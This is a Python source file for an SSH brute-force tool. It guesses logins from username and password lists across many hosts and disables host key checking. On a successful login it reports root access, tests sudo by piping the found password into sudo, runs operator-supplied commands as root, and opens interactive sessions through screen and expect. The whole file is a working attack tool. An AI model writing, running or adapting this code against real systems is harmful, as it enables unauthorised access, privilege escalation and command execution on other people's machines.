#!/usr/bin/python3

# This is 
#
#
# by sn0wfa11

import sys

try:
  import paramiko
  import os
  import multiprocessing
  import threading
  import argparse
  import time
  import subprocess

  from lib.common import *
  from lib.network import *
except Exception as err:
  print >> sys.stderr, err
  sys.exit(1)

usernames = []
passwords = []
hosts = []
ports = []
commands = []

screen_path = "/usr/bin/screen"
expect_path = "/usr/bin/expect"
ssh_path = "/usr/bin/ssh"

sudo_check_string = "uid=0(root)"

global verbose, delay, pairwise, screen, root_only, root_cmd, sudo_check
delay = 4

# List Import Functions
def get_usernames(filename):
  check_file(filename)
  with open(filename) as user_file:
    for line in user_file:
      line = line.strip()
      if line != "":
        usernames.append(line)

def get_passwords(filename):
  check_file(filename)
  with open(filename) as pass_file:
    for line in pass_file:
      line = line.strip()
      if line != "":
        passwords.append(line)

def get_hosts(filename):
  check_file(filename)
  with open(filename) as host_file:
    for line in host_file:
      split_host_port(line)

def split_host_port(host_input):
  host_port = host_input.split(':')
  host_port = [x.strip() for x in host_port]
  if host_port[0]:
    hosts.append(host_port[0])
    if len(host_port) < 2:
      ports.append(22)
    else:
      ports.append(int(host_port[1]))

def get_commands(filename):
  check_file(filename)
  with open(filename) as command_file:
    for line in command_file:
      line = line.strip()
      if line != "":
        commands.append(line)

# Delay to prevent errors with the ssh lib
def get_delay():
  return (delay * 0.1)

# Get the appropreate number of processes, no need for more than you have hosts
def process_count():
  if len(hosts) < multiprocessing.cpu_count():
    return len(hosts)
  else:
    return multiprocessing.cpu_count()

# Spawn an ssh session using GNU Screen
def spawn_screen(host, port, username, password):
  user_host = username + "@" + host

  script = "%s -dmS %s %s -c 'spawn %s -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -p %s \"%s\"; expect \"password:\"; send \"%s\n\"; interact'" % (screen_path, user_host, expect_path, ssh_path, str(port), user_host, password)

  subprocess.Popen(script, shell=True)
  print_status("ssh session opened on screen: " + user_host)

def run_ssh_commands(ssh, host, username):
  for command in commands:
    output = ""
    stdin, stdout, stderr = ssh.exec_command(command)

    stdout = stdout.readlines()
    stderr = stderr.readlines()
    for line in stdout:
      if line.strip() != "":
        output = output + line

    for line in stderr:
      if line.strip() != "":
        output = output + line
    
    if output != "":
      output = "[*] Ouput from commands on " + host + " as " + username + "\n" + output
      print(output)

# Check for Sudo rights
def sudo_test(ssh, username, password):
  sudo = False
  command = "echo '%s' | sudo -S su -c id" % (password)
  stdin, stdout, stderr = ssh.exec_command(command)
  stdout = stdout.readlines()
  stderr = stderr.readlines()

  for line in stdout:
    if sudo_check_string in line:
      sudo = True
      break

  return sudo

def sudo_run_commands(ssh, host, username, password):
  for command in commands:
    output = ""
    command = "echo '%s' | sudo -S su -c \"%s\"" % (password, command.replace('"', '\\"'))
    stdin, stdout, stderr = ssh.exec_command(command)

    stdout = stdout.readlines()
    stderr = stderr.readlines()
    for line in stdout:
      if line.strip() != "":
        output = output + line

    for line in stderr:
      if line.strip() != "":
        output = output + line
    
    if output != "":
      output = "[*] Ouput from sudo commands on " + host + " as " + username + "\n" + output
      print(output)

# Test a single ssh login option
def ssh_connect(host, port, username, password, code = 0):
  sudo_rights = False
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(host, port, username=username, password=password)
  except paramiko.AuthenticationException:
    code = 1
  except socket.error as e:
    code = 2
  except:
    code = 3
  
  if code == 0:
    if username == "root":
      print_good("Login found on " + host + " -> " + username + ":" + password + " <- ROOT PASSWORD!!!")
    else:
      if sudo_check:
        sudo_rights = sudo_test(ssh, username, password)
      if sudo_rights:
        print_good("Login found on " + host + " -> " + username + ":" + password + " <- SUDO RIGHTS!!!")
      else:
        print_good("Login found on " + host + " -> " + username + ":" + password)

    if screen or (screen_root and username == "root"):
      spawn_screen(host, port, username, password)

    if len(commands) > 0:
      if (not root_cmd) or (root_cmd and username == "root"):
        run_ssh_commands(ssh, host, username)
      if (root_cmd and sudo_rights):
        sudo_run_commands(ssh, host, username, password)

  elif code == 1:
    printv_nomatch(username + ":" + password + " no match on " + host, verbose)
  elif code == 2:
    printv_nomatch("Connection Could Not Be Established For: " + host + " You might be blocked now...", verbose)
  elif code == 3:
    printv_nomatch("Unable to connect to: " + host + ":" + str(port), verbose)
    pass

  ssh.close()
  pass

# Username and password checking
# Spawns a thread for each combination based on pairwise or not
def check_up(host, port, host_event, host_last):
  if not port_open(host, port):
    printv_nomatch("Unable to connect to: " + host + ":" + str(port), verbose)
  else:
    up_threads = []
    errored = False

    if pairwise:
      for x in range(0, len(usernames)):
        if not port_open(host, port):
          print_nomatch("Unable to connect to: " + host + ":" + str(port))
          break
        else:
          up_thread = threading.Thread(target=ssh_connect, args=(host, port, usernames[x], passwords[x],))
          time.sleep(get_delay())
          up_thread.start()
          up_threads.append(up_thread)

    else:
      for username in usernames:
        for password in passwords:
          if not port_open(host, port):
            errored = True
            break
          else:
            up_thread = threading.Thread(target=ssh_connect, args=(host, port, username, password))
            time.sleep(get_delay())
            up_thread.start()
            up_threads.append(up_thread)
        if errored:
          print_nomatch("Unable to connect to: " + host + ":" + str(port))
          break

    for thread in up_threads:
      thread.join()

  if host_last:
    host_event.set()
  pass

# Runs through the host list, multiprocessing by host
def run_hosts():
  host_last = False
  host_pool = multiprocessing.Pool(process_count())
  host_manager = multiprocessing.Manager()
  host_event = host_manager.Event()

  for x in range(0, len(hosts)):
    if hosts[x] == hosts[len(hosts) - 1]:
      host_last = True
    host_pool.apply_async(check_up, (hosts[x], ports[x], host_event, host_last))

  host_pool.close()
  host_event.wait()
  host_pool.terminate()

# Argument parser
def parse_args(args, parser):
  global verbose, delay, pairwise, screen, screen_root, root_cmd, sudo_check
  verbose = args.verbose
  pairwise = args.pairwise
  screen_root = args.screen_root
  screen = args.screen
  root_cmd = args.root_cmd
  sudo_check = args.sudo_check

  if args.delay:
    delay = args.delay

  if args.host:
    split_host_port(args.host)
  if args.host_file:
    get_hosts(args.host_file)
  if len(hosts) < 1:
    print_exit("You must specify at least one host!", parser)

  if args.username:
    usernames.append(args.username)
  if args.user_file:
    get_usernames(args.user_file)
  if len(usernames) < 1:
    print_exit("You must specify at least one username!", parser)

  if args.password:
    passwords.append(args.password)
  if args.pass_file:
    get_passwords(args.pass_file)
  if len(passwords) < 1:
    print_exit("You must specify at least one password!", parser)

  if args.command:
    commands.append(args.command)
  if args.command_file:
    get_commands(args.command_file)

# Main Function
def main(argv):
  parser = argparse.ArgumentParser(description = "Brute Forcer for SSH with ability to execute commands and check for sudo rights.")
  parser.add_argument("-u", "--username", type = str, help = "Single username to test")
  parser.add_argument("-U", "--user_file", type = str, help = "File containing usernames. One per line.")
  parser.add_argument("-p", "--password", type = str, help = "Single password to test")
  parser.add_argument("-P", "--pass_file", type = str, help = "File containing passwords. One per line.")
  parser.add_argument("-t", "--host", type = str, help = "Single host to test. <host> or <host>:<port> IPv6 is ok too.")
  parser.add_argument("-T", "--host_file", type = str, help = "File containing hosts. One per line. <host> or <host>:<port> IPv6 is ok too.")
  parser.add_argument("-v", "--verbose", action = "store_true", help = "Display all host:username:password tests.")
  parser.add_argument("-w", "--pairwise", action = "store_true", help = "Test username and password combos in line by line match. Must have same number of each!")
  parser.add_argument("-d", "--delay", type = int, choices = [1, 2, 3, 4, 5, 6, 7, 8], help = "Delay amout. Increase in case of errors. Default = 4")
  parser.add_argument("-s", "--screen_root", action = "store_true", help = "Spawn an ssh login in screen for root credentials only.")
  parser.add_argument("-S", "--screen", action = "store_true", help = "Spawn an ssh login in screen for all found credentials.")
  parser.add_argument("-c", "--command", type = str, help = "Single command to run on successful ssh login.")
  parser.add_argument("-C", "--command_file", type = str, help = "File containing commands to run on successful ssh login. One per line.")
  parser.add_argument("-r", "--root_cmd", action = "store_true", help = "Only run specified command on login when root or sudo account found.")
  parser.add_argument("-D", "--sudo_check", action = "store_true", help = "Check for sudo rights on non-root logins.")
  
  args = parser.parse_args()
  if len(argv) == 1:
    help_exit(parser)
  parse_args(args, parser)

  print_status("Starting brute force...")

  if pairwise and (len(usernames) != len(passwords)):
    print_error("Username and password numbers do not match in pairwise mode! Exiting...")
    sys.exit(4)

  run_hosts()
  print_status("Done.")

# Ref to main function
if __name__ == "__main__":
  try:
    main(sys.argv)
  except KeyboardInterrupt:
    print("\n\n[*] Exiting...")
    sys.exit(3)
